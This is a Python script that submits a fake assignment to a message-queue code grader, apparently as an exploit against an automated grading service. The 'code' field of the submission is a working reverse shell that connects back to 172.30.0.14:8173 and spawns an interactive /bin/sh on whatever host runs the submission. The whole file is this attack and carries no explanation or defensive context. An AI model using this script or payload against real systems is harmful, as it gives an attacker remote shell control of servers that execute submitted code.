#!/usr/bin/env python
import pika
import os
import uuid
MQ_SERVER = os.environ.get("MQ_SERVER", "172.30.0.4")
MQ_PORT = int(os.environ.get("MQ_PORT", 5671))
MQ_SSL = os.environ.get("MQ_SSL", "true").lower() == "true"
CA_CERT = os.environ.get("CA_CERT", None)

if MQ_SSL:
    ssl_opts = {'ca_certs': CA_CERT}
else:
    ssl_opts = None

connection = pika.BlockingConnection(pika.ConnectionParameters(
        host=MQ_SERVER,
        port=MQ_PORT,
        ssl=MQ_SSL,
        ssl_options=ssl_opts,
        heartbeat=0,
        blocked_connection_timeout=60,
        connection_attempts=10,
        retry_delay=3
    ))
channel = connection.channel()
channel.queue_declare(queue='submissions')
result = channel.queue_declare(exclusive=True)
callback_queue = result.method.queue

payload = '{"user": "root", "assignment": "assignment_one", "code": "MY_IP=\\"172.30.0.14\\"\\nMY_PORT=8173\\nimport socket,subprocess,os\\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\\ns.connect((MY_IP,MY_PORT));os.dup2(s.fileno(),0)\\nos.dup2(s.fileno(),1)\\nos.dup2(s.fileno(),2)\\np=subprocess.call([\\"/bin/sh\\",\\"-i\\"])"}'


corr_id = str(uuid.uuid4())
channel.basic_publish(exchange='',
                      routing_key='submissions',
                      properties=pika.BasicProperties(
                            reply_to = callback_queue,
                            correlation_id=corr_id
                            ),
                      body=payload)
print(" [x] Sent payload")

connection.close()